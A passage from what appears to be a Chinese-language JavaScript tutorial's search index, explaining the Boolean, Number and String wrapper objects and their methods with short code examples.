无输出</code></pre><p>上面代码的第一个例子之所以得到<code>true</code>，是因为<code>false</code>对应的包装对象实例是一个对象，进行逻辑运算时，被自动转化成布尔值<code>true</code>（因为所有对象对应的布尔值都是<code>true</code>）。而实例的<code>valueOf</code>方法，则返回实例对应的原始值，本例为<code>false</code>。</p>\n\n        <h2>\n            <a href='#Boolean-函数的类型转换作用' class='header-anchor'>#</a>\n            <span>Boolean 函数的类型转换作用</span>\n        </h2>\n    <p><code>Boolean</code>对象除了可以作为构造函数，还可以单独使用，将任意值转为布尔值。这时<code>Boolean</code>就是一个单纯的工具方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>Boolean(undefined) // false\nBoolean(null) // false\nBoolean(0) // false\nBoolean(&#039;&#039;) // false\nBoolean(NaN) // false\n\nBoolean(1) // true\nBoolean(&#039;false&#039;) // true\nBoolean([]) // true\nBoolean({}) // true\nBoolean(function () {}) // true\nBoolean(/foo/) // true</code></pre><p>上面代码中几种得到<code>true</code>的情况，都值得认真记住。</p>\n<p>顺便提一下，使用双重的否运算符（<code>!</code>）也可以将任意值转为对应的布尔值。</p>\n<pre class=\"prettyprint language-javascript\"><code>!!undefined // false\n!!null // false\n!!0 // false\n!!&#039;&#039; // false\n!!NaN // false\n!!1 // true\n!!&#039;false&#039; // true\n!![] // true\n!!{} // true\n!!function(){} // true\n!!/foo/ // true</code></pre><p>最后，对于一些特殊值，<code>Boolean</code>对象前面加不加<code>new</code>，会得到完全相反的结果，必须小心。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (Boolean(false)) {\n  console.log(&#039;true&#039;);\n} // 无输出\n\nif (new Boolean(false)) {\n  console.log(&#039;true&#039;);\n} // true\n\nif (Boolean(null)) {\n  console.log(&#039;true&#039;);\n} // 无输出\n\nif (new Boolean(null)) {\n  console.log(&#039;true&#039;);\n} // true</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"Number 对象","link":"/stdlib/number.html"}],"content":"\n        <h1>\n            <a href='#Number-对象' class='header-anchor'>#</a>\n            <span>Number 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p><code>Number</code>对象是数值对应的包装对象，可以作为构造函数使用，也可以作为工具函数使用。</p>\n<p>作为构造函数时，它用于生成值为数值的对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var n = new Number(1);\ntypeof n // &quot;object&quot;</code></pre><p>上面代码中，<code>Number</code>对象作为构造函数使用，返回一个值为<code>1</code>的对象。</p>\n<p>作为工具函数时，它可以将任何类型的值转为数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number(true) // 1</code></pre><p>上面代码将布尔值<code>true</code>转为数值<code>1</code>。<code>Number</code>作为工具函数的用法，详见《数据类型转换》一章。</p>\n\n        <h2>\n            <a href='#静态属性' class='header-anchor'>#</a>\n            <span>静态属性</span>\n        </h2>\n    <p><code>Number</code>对象拥有以下一些静态属性（即直接定义在<code>Number</code>对象上的属性，而不是定义在实例上的属性）。</p>\n<ul>\n<li><code>Number.POSITIVE_INFINITY</code>：正的无限，指向<code>Infinity</code>。</li>\n<li><code>Number.NEGATIVE_INFINITY</code>：负的无限，指向<code>-Infinity</code>。</li>\n<li><code>Number.NaN</code>：表示非数值，指向<code>NaN</code>。</li>\n<li><code>Number.MIN_VALUE</code>：表示最小的正数（即最接近0的正数，在64位浮点数体系中为<code>5e-324</code>），相应的，最接近0的负数为<code>-Number.MIN_VALUE</code>。</li>\n<li><code>Number.MAX_SAFE_INTEGER</code>：表示能够精确表示的最大整数，即<code>9007199254740991</code>。</li>\n<li><code>Number.MIN_SAFE_INTEGER</code>：表示能够精确表示的最小整数，即<code>-9007199254740991</code>。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>Number.POSITIVE_INFINITY // Infinity\nNumber.NEGATIVE_INFINITY // -Infinity\nNumber.NaN // NaN\n\nNumber.MAX_VALUE\n// 1.7976931348623157e+308\nNumber.MAX_VALUE &lt; Infinity\n// true\n\nNumber.MIN_VALUE\n// 5e-324\nNumber.MIN_VALUE &gt; 0\n// true\n\nNumber.MAX_SAFE_INTEGER // 9007199254740991\nNumber.MIN_SAFE_INTEGER // -9007199254740991</code></pre>\n        <h2>\n            <a href='#实例方法' class='header-anchor'>#</a>\n            <span>实例方法</span>\n        </h2>\n    <p><code>Number</code>对象有4个实例方法，都跟将数值转换成指定格式有关。</p>\n\n        <h3>\n            <a href='#Number.prototype.toString()' class='header-anchor'>#</a>\n            <span>Number.prototype.toString()</span>\n        </h3>\n    <p><code>Number</code>对象部署了自己的<code>toString</code>方法，用来将一个数值转为字符串形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>(10).toString() // &quot;10&quot;</code></pre><p><code>toString</code>方法可以接受一个参数，表示输出的进制。如果省略这个参数，默认将数值先转为十进制，再输出字符串；否则，就根据参数指定的进制，将一个数字转化成某个进制的字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>(10).toString(2) // &quot;1010&quot;\n(10).toString(8) // &quot;12&quot;\n(10).toString(16) // &quot;a&quot;</code></pre><p>上面代码中，<code>10</code>一定要放在括号里，这样表明后面的点表示调用对象属性。如果不加括号，这个点会被 JavaScript 引擎解释成小数点，从而报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>10.toString(2)\n// SyntaxError: Unexpected token ILLEGAL</code></pre><p>只要能够让 JavaScript 引擎不混淆小数点和对象的点运算符，各种写法都能用。除了为<code>10</code>加上括号，还可以在<code>10</code>后面加两个点，JavaScript 会把第一个点理解成小数点（即<code>10.0</code>），把第二个点理解成调用对象属性，从而得到正确结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>10..toString(2)\n// &quot;1010&quot;\n\n// 其他方法还包括\n10 .toString(2) // &quot;1010&quot;\n10.0.toString(2) // &quot;1010&quot;</code></pre><p>这实际上意味着，可以直接对一个小数使用<code>toString</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>10.5.toString() // &quot;10.5&quot;\n10.5.toString(2) // &quot;1010.1&quot;\n10.5.toString(8) // &quot;12.4&quot;\n10.5.toString(16) // &quot;a.8&quot;</code></pre><p>通过方括号运算符也可以调用<code>toString</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>10[&#039;toString&#039;](2) // &quot;1010&quot;</code></pre><p><code>toString</code>方法只能将十进制的数，转为其他进制的字符串。如果要将其他进制的数，转回十进制，需要使用<code>parseInt</code>方法。</p>\n\n        <h3>\n            <a href='#Number.prototype.toFixed()' class='header-anchor'>#</a>\n            <span>Number.prototype.toFixed()</span>\n        </h3>\n    <p><code>toFixed</code>方法先将一个数转为指定位数的小数，然后返回这个小数对应的字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>(10).toFixed(2) // &quot;10.00&quot;\n10.005.toFixed(2) // &quot;10.01&quot;</code></pre><p>上面代码中，<code>10</code>和<code>10.005</code>转成2位小数，其中<code>10</code>必须放在括号里，否则后面的点会被处理成小数点。</p>\n<p><code>toFixed</code>方法的参数为小数位数，有效范围为0到20，超出这个范围将抛出 RangeError 错误。</p>\n\n        <h3>\n            <a href='#Number.prototype.toExponential()' class='header-anchor'>#</a>\n            <span>Number.prototype.toExponential()</span>\n        </h3>\n    <p><code>toExponential</code>方法用于将一个数转为科学计数法形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>(10).toExponential()  // &quot;1e+1&quot;\n(10).toExponential(1) // &quot;1.0e+1&quot;\n(10).toExponential(2) // &quot;1.00e+1&quot;\n\n(1234).toExponential()  // &quot;1.234e+3&quot;\n(1234).toExponential(1) // &quot;1.2e+3&quot;\n(1234).toExponential(2) // &quot;1.23e+3&quot;</code></pre><p><code>toExponential</code>方法的参数是小数点后有效数字的位数，范围为0到20，超出这个范围，会抛出一个 RangeError 错误。</p>\n\n        <h3>\n            <a href='#Number.prototype.toPrecision()' class='header-anchor'>#</a>\n            <span>Number.prototype.toPrecision()</span>\n        </h3>\n    <p><code>toPrecision</code>方法用于将一个数转为指定位数的有效数字。</p>\n<pre class=\"prettyprint language-javascript\"><code>(12.34).toPrecision(1) // &quot;1e+1&quot;\n(12.34).toPrecision(2) // &quot;12&quot;\n(12.34).toPrecision(3) // &quot;12.3&quot;\n(12.34).toPrecision(4) // &quot;12.34&quot;\n(12.34).toPrecision(5) // &quot;12.340&quot;</code></pre><p><code>toPrecision</code>方法的参数为有效数字的位数，范围是1到21，超出这个范围会抛出 RangeError 错误。</p>\n<p><code>toPrecision</code>方法用于四舍五入时不太可靠，跟浮点数不是精确储存有关。</p>\n<pre class=\"prettyprint language-javascript\"><code>(12.35).toPrecision(3) // &quot;12.3&quot;\n(12.25).toPrecision(3) // &quot;12.3&quot;\n(12.15).toPrecision(3) // &quot;12.2&quot;\n(12.45).toPrecision(3) // &quot;12.4&quot;</code></pre>\n        <h2>\n            <a href='#自定义方法' class='header-anchor'>#</a>\n            <span>自定义方法</span>\n        </h2>\n    <p>与其他对象一样，<code>Number.prototype</code>对象上面可以自定义方法，被<code>Number</code>的实例继承。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number.prototype.add = function (x) {\n  return this + x;\n};\n\n8[&#039;add&#039;](2) // 10</code></pre><p>上面代码为<code>Number</code>对象实例定义了一个<code>add</code>方法。在数值上调用某个方法，数值会自动转为<code>Number</code>的实例对象，所以就可以调用<code>add</code>方法了。由于<code>add</code>方法返回的还是数值，所以可以链式运算。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number.prototype.subtract = function (x) {\n  return this - x;\n};\n\n(8).add(2).subtract(4)\n// 6</code></pre><p>上面代码在<code>Number</code>对象的实例上部署了<code>subtract</code>方法，它可以与<code>add</code>方法链式调用。</p>\n<p>我们还可以部署更复杂的方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number.prototype.iterate = function () {\n  var result = [];\n  for (var i = 0; i &lt;= this; i++) {\n    result.push(i);\n  }\n  return result;\n};\n\n(8).iterate()\n// [0, 1, 2, 3, 4, 5, 6, 7, 8]</code></pre><p>上面代码在<code>Number</code>对象的原型上部署了<code>iterate</code>方法，将一个数值自动遍历为一个数组。</p>\n<p>注意，数值的自定义方法，只能定义在它的原型对象<code>Number.prototype</code>上面，数值本身是无法自定义属性的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var n = 1;\nn.x = 1;\nn.x // undefined</code></pre><p>上面代码中，<code>n</code>是一个原始类型的数值。直接在它上面新增一个属性<code>x</code>，不会报错，但毫无作用，总是返回<code>undefined</code>。这是因为一旦被调用属性，<code>n</code>就自动转为<code>Number</code>的实例对象，调用结束后，该对象自动销毁。所以，下一次调用<code>n</code>的属性时，实际取到的是另一个对象，属性<code>x</code>当然就读不出来。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"String 对象","link":"/stdlib/string.html"}],"content":"\n        <h1>\n            <a href='#String-对象' class='header-anchor'>#</a>\n            <span>String 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p><code>String</code>对象是 JavaScript 原生提供的三个包装对象之一，用来生成字符串对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s1 = &#039;abc&#039;;\nvar s2 = new String(&#039;abc&#039;);\n\ntypeof s1 // &quot;string&quot;\ntypeof s2 // &quot;object&quot;\n\ns2.valueOf() // &quot;abc&quot;</code></pre><p>上面代码中，变量<code>s1</code>是字符串，<code>s2</code>是对象。由于<code>s2</code>是字符串对象，<code>s2.valueOf</code>方法返回的就是它所对应的原始字符串。</p>\n<p>字符串对象是一个类似数组的对象（很像数组，但不是数组）。</p>\n<pre class=\"prettyprint language-javascript\"><code>new String(&#039;abc&#039;)\n// String {0: &quot;a&quot;, 1: &quot;b&quot;, 2: &quot;c&quot;, length: 3}\n\n(new String(&#039;abc&#039;))[1] // &quot;b&quot;</code></pre><p>上面代码中，字符串<code>abc</code>对应的字符串对象，有数值键（<code>0</code>、<code>1</code>、<code>2</code>）和<code>length</code>属性，所以可以像数组那样取值。</p>\n<p>除了用作构造函数，<code>String</code>对象还可以当作工具方法使用，将任意类型的值转为字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>String(true) // &quot;true&quot;\nString(5) // &quot;5&quot;</code></pre><p>上面代码将布尔值<code>ture</code>和数值<code>5</code>，分别转换为字符串。</p>\n\n        <h2>\n            <a href='#静态方法' class='header-anchor'>#</a>\n            <span>静态方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#String.fromCharCode()' class='header-anchor'>#</a>\n            <span>String.fromCharCode()</span>\n        </h3>\n    <p><code>String</code>对象提供的静态方法（即定义在对象本身，而不是定义在对象实例的方法），主要是<code>String.fromCharCode()</code>。该方法的参数是一个或多个数值，代表 Unicode 码点，返回值是这些码点组成的字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>String.fromCharCode() // &quot;&quot;\nString.fromCharCode(97) // &quot;a&quot;\nString.fromCharCode(104, 101, 108, 108, 111)\n// &quot;hello&quot;</code></pre><p>上面代码中，<code>String.fromCharCode</code>方法的参数为空，就返回空字符串；否则，返回参数对应的 Unicode 字符串。</p>\n<p>注意，该方法不支持 Unicode 码点大于<code>0xFFFF</code>的字符，即传入的参数不能大于<code>0xFFFF</code>（即十进制的 65535）。</p>\n<pre class=\"prettyprint language-javascript\"><code>String.fromCharCode(0x20BB7)\n// &quot;ஷ&quot;\nString.fromCharCode(0x20BB7) === String.fromCharCode(0x0BB7)\n// true</code></pre><p>上面代码中，<code>String.fromCharCode</code>参数<code>0x20BB7</code>大于<code>0xFFFF</code>，导致返回结果出错。<code>0x20BB7</code>对应的字符是汉字<code>𠮷</code>，但是返回结果却是另一个字符（码点<code>0x0BB7</code>）。这是因为<code>String.fromCharCode</code>发现参数值大于<code>0xFFFF</code>，就会忽略多出的位（即忽略<code>0x20BB7</code>里面的<code>2</code>）。</p>\n<p>这种现象的根本原因在于，码点大于<code>0xFFFF</code>的字符占用四个字节，而 JavaScript 默认支持两个字节的字符。这种情况下，必须把<code>0x20BB7</code>拆成两个字符表示。</p>\n<pre class=\"prettyprint language-javascript\"><code>String.fromCharCode(0xD842, 0xDFB7)\n// &quot;𠮷&quot;</code></pre><p>上面代码中，<code>0x20BB7</code>拆成两个字符<code>0xD842</code>和<code>0xDFB7</code>（即两个两字节字符，合成一个四字节字符），就能得到正确的结果。码点大于<code>0xFFFF</code>的字符的四字节表示法，由 UTF-16 编码方法决定。</p>\n\n        <h2>\n            <a href='#实例属性' class='header-anchor'>#</a>\n            <span>实例属性</span>\n        </h2>\n    \n        <h3>\n            <a href='#String.prototype.length' class='header-anchor'>#</a>\n            <span>String.prototype.length</span>\n        </h3>\n    <p>字符串实例的<code>length</code>属性返回字符串的长度。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;.length // 3</code></pre>\n        <h2>\n            <a href='#实例方法' class='header-anchor'>#</a>\n            <span>实例方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#String.prototype.charAt()' class='header-anchor'>#</a>\n            <span>String.prototype.charAt()</span>\n        </h3>\n    <p><code>charAt</code>方法返回指定位置的字符，参数是从<code>0</code>开始编号的位置。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = new String(&#039;abc&#039;);\n\ns.charAt(1) // &quot;b&quot;\ns.charAt(s.length - 1) // &quot;c&quot;</code></pre><p>这个方法完全可以用数组下标替代。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;.charAt(1) // &quot;b&quot;\n&#039;abc&#039;[1] // &quot;b&quot;</code></pre><p>如果参数为负数，或大于等于字符串的长度，<code>charAt</code>返回空字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;.charAt(-1) // &quot;&quot;\n&#039;abc&#039;.charAt(3) // &quot;&quot;</code></pre>\n        <h3>\n            <a href='#String.prototype.charCodeAt()' class='header-anchor'>#</a>\n            <span>String.prototype.charCodeAt()</span>\n        </h3>\n    <p><code>charCodeAt</code>方法返回字符串指定位置的 Unicode 码点（十进制表示），相当于<code>String.fromCharCode()</code>的逆操作。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;.charCodeAt(1) // 98</code></pre><p>上面代码中，<code>abc</code>的<code>1</code>号位置的字符是<code>b</code>，它的 Unicode 码点是<code>98</code>。</p>\n<p>如果没有任何参数，<code>charCodeAt</code>返回首字符的 Unicode 码点。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;.charCodeAt() // 97</code></pre><p>如果参数为负数，或大于等于字符串的长度，<code>charCodeAt</code>返回<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;.charCodeAt(-1) // NaN\n&#039;abc&#039;.charCodeAt(4) // NaN</code></pre><p>注意，<code>charCodeAt</code>方法返回的 Unicode 码点不会大于65536（0xFFFF），也就是说，只返回两个字节的字符的码点。如果遇到码点大于 65536 的字符（四个字节的字符），必需连续使用两次<code>charCodeAt</code>，不仅读入<code>charCodeAt(i)</code>，还要读入<code>charCodeAt(i+1)</code>，将两个值放在一起，才能得到准确的字符。</p>\n\n        <h3>\n            <a href='#String.prototype.concat()' class='header-anchor'>#</a>\n            <span>String.prototype.concat()</span>\n        </h3>\n    <p><code>concat</code>方法用于连接两个字符串，返回一个新字符串，不改变原字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s1 = &#039;abc&#039;;\nvar s2 = &#039;def&#039;;\n\ns1.concat(s2) // &quot;abcdef&quot;\ns1 // &quot;abc&quot;</code></pre><p>该方法可以接受多个参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a&#039;.concat(&#039;b&#039;, &#039;c&#039;) // &quot;abc&quot;</code></pre><p>如果参数不是字符串，<code>concat</code>方法会将其先转为字符串，然后再连接。</p>\n<pre class=\"prettyprint language-javascript\"><code>var one = 1;\nvar two = 2;\nvar three = &#039;3&#039;;\n\n&#039;&#039;.concat(one, two, three) // &quot;123&quot;\none + two + three // &quot;33&quot;</code></pre><p>上面代码中，<code>concat</code>方法将参数先转成字符串再连接，所以返回的是一个三个字符的字符串。作为对比，加号运算符在两个运算数都是数值时，不会转换类型，所以返回的是一个两个字符的字符串。</p>\n\n        <h3>\n            <a href='#String.prototype.slice()' class='header-anchor'>#</a>\n            <span>String.prototype.slice()</span>\n        </h3>\n    <p><code>slice</code>方法用于从原字符串取出子字符串并返回，不改变原字符串。它的第一个参数是子字符串的开始位置，第二个参数是子字符串的结束位置（不含该位置）。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.slice(0, 4) // &quot;Java&quot;</code></pre><p>如果省略第二个参数，则表示子字符串一直到原字符串结束。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.slice(4) // &quot;Script&quot;</code></pre><p>如果参数是负值，表示从结尾开始倒数计算的位置，即该负值加上字符串长度。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.slice(-6) // &quot;Script&quot;\n&#039;JavaScript&#039;.slice(0, -6) // &quot;Java&quot;\n&#039;JavaScript&#039;.slice(-2, -1) // &quot;p&quot;</code></pre><p>如果第一个参数大于第二个参数，<code>slice</code>方法返回一个空字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.slice(2, 1) // &quot;&quot;</code></pre>\n        <h3>\n            <a href='#String.prototype.substring()' class='header-anchor'>#</a>\n            <span>String.prototype.substring()</span>\n        </h3>\n    <p><code>substring</code>方法用于从原字符串取出子字符串并返回，不改变原字符串，跟<code>slice</code>方法很相像。它的第一个参数表示子字符串的开始位置，第二个位置表示结束位置（返回结果不含该位置）。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.substring(0, 4) // &quot;Java&quot;</code></pre><p>如果省略第二个参数，则表示子字符串一直到原字符串的结束。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.substring(4) // &quot;Script&quot;</code></pre><p>如果第一个参数大于第二个参数，<code>substring</code>方法会自动更换两个参数的位置。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.substring(10, 4) // &quot;Script&quot;\n// 等同于\n&#039;JavaScript&#039;.substring(4, 10) // &quot;Script&quot;</code></pre><p>上面代码中，调换<code>substring</code>方法的两个参数，都得到同样的结果。</p>\n<p>如果参数是负数，<code>substring</code>方法会自动将负数转为0。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;Javascript&#039;.substring(-3) // &quot;JavaScript&quot;\n&#039;JavaScript&#039;.substring(4, -3) // &quot;Java&quot;</code></pre><p>上面代码中，第二个例子的参数<code>-3</code>会自动变成<code>0</code>，等同于<code>&#39;JavaScript&#39;.substring(4, 0)</code>。由于第二个参数小于第一个参数，会自动互换位置，所以返回<code>Java</code>。</p>\n<p>由于这些规则违反直觉，因此不建议使用<code>substring</code>方法，应该优先使用<code>slice</code>。</p>\n\n        <h3>\n            <a href='#String.prototype.substr()' class='header-anchor'>#</a>\n            <span>String.prototype.substr()</span>\n        </h3>\n    <p><code>substr</code>方法用于从原字符串取出子字符串并返回，不改变原字符串，跟<code>slice</code>和<code>substring</code>方法的作用相同。</p>\n<p><code>substr</code>方法的第一个参数是子字符串的开始位置（从0开始计算），第二个参数是子字符串的长度。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.substr(4, 6) // &quot;Script&quot;</code></pre><p>如果省略第二个参数，则表示子字符串一直到原字符串的结束。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.substr(4) // &quot;Script&quot;</code></pre><p>如果第一个参数是负数，表示倒数计算的字符位置。如果第二个参数是负数，将被自动转为0，因此会返回空字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;JavaScript&#039;.substr(-6) // &quot;Script&quot;\n&#039;JavaScript&#039;.substr(4, -1) // &quot;&quot;</code></pre><p>上面代码中，第二个例子的参数<code>-1</code>自动转为<code>0</code>，表示子字符串长度为<code>0</code>，所以返回空字符串。</p>\n\n        <h3>\n            <a href='#String.prototype.indexOf()，String.prototype.lastIndexOf()' class='header-anchor'>#</a>\n            <span>String.prototype.indexOf()，String.prototype.lastIndexOf()</span>\n        </h3>\n    <p><code>indexOf</code>方法用于确定一个字符串在另一个字符串中第一次出现的位置，返回结果是匹配开始的位置。如果返回<code>-1</code>，就表示不匹配。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;hello world&#039;.indexOf(&#039;o&#039;) // 4\n&#039;JavaScript&#039;.indexOf(&#039;script&#039;) // -1</code></pre><p><code>indexOf</code>方法还可以接受第二个参数，表示从该位置开始向后匹配。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;hello world&#039;.indexOf(&#039;o&#039;, 6) // 7</code></pre><p><code>lastIndexOf</code>方法的用法跟<code>indexOf</code>方法一致，主要的区别是<code>lastIndexOf</code>从尾部开始匹配，<code>indexOf</code>则是从头部开始匹配。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;hello world&#039;.lastIndexOf(&#039;o&#039;) // 7</code></pre><p>另外，<code>lastIndexOf</code>的第二个参数表示从该位置起向前匹配。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;hello world&#039;.lastIndexOf(&#039;o&#039;, 6) // 4</code></pre>\n        <h3>\n            <a href='#String.prototype.trim()' class='header-anchor'>#</a>\n            <span>String.prototype.trim()</span>\n        </h3>\n    <p><code>trim</code>方法用于去除字符串两端的空格，返回一个新字符串，不改变原字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;  hello world  &#039;.trim()\n// &quot;hello world&quot;</code></pre><p>该方法去除的不仅是空格，还包括制表符（<code>\\t</code>、<code>\\v</code>）、换行符（<code>\\n</code>）和回车符（<code>\\r</code>）。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;\\r\\nabc \\t&#039;.trim() // &#039;abc&#039;</code></pre>\n        <h3>\n            <a href='#String.prototype.toLowerCase()，String.prototype.toUpperCase()' class='header-anchor'>#</a>\n            <span>String.prototype.toLowerCase()，String.prototype.toUpperCase()</span>\n        </h3>\n    <p><code>toLowerCase</code>方法用于将一个字符串全部转为小写，<code>toUpperCase</code>则是全部转为大写。它们都返回一个新字符串，不改变原字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;Hello World&#039;.toLowerCase()\n// &quot;hello world&quot;\n\n&#039;Hello World&#039;.toUpperCase()\n// &quot;HELLO WORLD&quot;</code></pre>\n        <h3>\n            <a href='#String.prototype.match()' class='header-anchor'>#</a>\n            <span>String.prototype.match()</span>\n        </h3>\n    <p><code>match</code>方法用于确定原字符串是否匹配某个子字符串，返回一个数组，成员为匹配的第一个字符串。如果没有找到匹配，则返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;cat, bat, sat, fat&#039;.match(&#039;at&#039;) // [&quot;at&quot;]\n&#039;cat, bat, sat, fat&#039;.match(&#039;xt&#039;) // null</code></pre><p>返回的数组还有<code>index</code>属性和<code>input</code>属性，分别表示匹配字符串开始的位置和原始字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var matches = &#039;cat, bat, sat, fat&#039;.match(&#039;at&#039;);\nmatches.index // 1\nmatches.input // &quot;cat, bat, sat, fat&quot;</code></pre><p><code>match</code>方法还可以使用正则表达式作为参数，详见《正则表达式》一章。</p>\n\n        <h3>\n            <a href='#String.prototype.search()，String.prototype.replace()' class='header-anchor'>#</a>\n            <span>String.prototype.search()，String.prototype.replace()</span>\n        </h3>\n    <p><code>search</code>方法的用法基本等同于<code>match</code>，但是返回值为匹配的第一个位置。如果没有找到匹配，则返回<code>-1</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;cat, bat, sat, fat&#039;.search(&#039;at&#039;) // 1</code></pre><p><code>search</code>方法还可以使用正则表达式作为参数，详见《正则表达式》一节。</p>\n<p><code>replace</code>方法用于替换匹配的子字符串，一般情况下只替换第一个匹配（除非使用带有<code>g</code>修饰符的正则表达式）。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;aaa&#039;.replace(&#039;a&#039;, &#039;b&#039;) // &quot;baa&quot;</code></pre><p><code>replace</code>方法还可以使用正则表达式作为参数，详见《正则表达式》一节。</p>\n\n        <h3>\n            <a href='#String.prototype.split()' class='header-anchor'>#</a>\n            <span>String.prototype.split()</span>\n        </h3>\n    <p><code>split</code>方法按照给定规则分割字符串，返回一个由分割出来的子字符串组成的数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a|b|c&#039;.split(&#039;|&#039;) // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</code></pre><p>如果分割规则为空字符串，则返回数组的成员是原字符串的每一个字符。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a|b|c&#039;.split(&#039;&#039;) // [&quot;a&quot;, &quot;|&quot;, &quot;b&quot;, &quot;|&quot;, &quot;c&quot;]</code></pre><p>如果省略参数，则返回数组的唯一成员就是原字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a|b|c&#039;.split() // [&quot;a|b|c&quot;]</code></pre><p>如果满足分割规则的两个部分紧邻着（即两个分割符中间没有其他字符），则返回数组之中会有一个空字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a||c&#039;.split(&#039;|&#039;) // [&#039;a&#039;, &#039;&#039;, &#039;c&#039;]</code></pre><p>如果满足分割规则的部分处于字符串的开头或结尾（即它的前面或后面没有其他字符），则返回数组的第一个或最后一个成员是一个空字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;|b|c&#039;.split(&#039;|&#039;) // [&quot;&quot;, &quot;b&quot;, &quot;c&quot;]\n&#039;a|b|&#039;.split(&#039;|&#039;) // [&quot;a&quot;, &quot;b&quot;, &quot;&quot;]</code></pre><p><code>split</code>方法还可以接受第二个参数，限定返回数组的最大成员数。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a|b|c&#039;.split(&#039;|&#039;, 0) // []\n&#039;a|b|c&#039;.split(&#039;|&#039;, 1) // [&quot;a&quot;]\n&#039;a|b|c&#039;.split(&#039;|&#039;, 2) // [&quot;a&quot;, &quot;b&quot;]\n&#039;a|b|c&#039;.split(&#039;|&#039;, 3) // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]\n&#039;a|b|c&#039;.split(&#039;|&#039;, 4) // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</code></pre><p>上面代码中，<code>split</code>方法的第二个参数，决定了返回数组的成员数。</p>\n<p><code>split</code>方法还可以使用正则表达式作为参数，详见《正则表达式》一节。</p>\n\n        <h3>\n            <a href='#String.prototype.localeCompare()' class='header-anchor'>#</a>\n            <span>String.prototype.localeCompare()</span>\n        </h3>\n    <p><code>localeCompare</code>方法用于比较两个字符串。它返回一个整数，如果小于0，表示第一个字符串小于第二个字符串；如果等于0，表示两者相等；如果大于0，表示第一个字符串大于第二个字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;apple&#039;.localeCompare(&#039;banana&#039;) // -1\n&#039;apple&#039;.localeCompare(&#039;apple&#039;) // 0</code></pre><p>该方法的最大特点，就是会考虑自然语言的顺序。举例来说，正常情况下，大写的英文字母小于小写字母。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;B&#039; &gt; &#039;a&#039; // false</code></pre><p>上面代码中，字母<code>B</code>小于字母<code>a</code>。因为 JavaScript 采用的是 Unicode 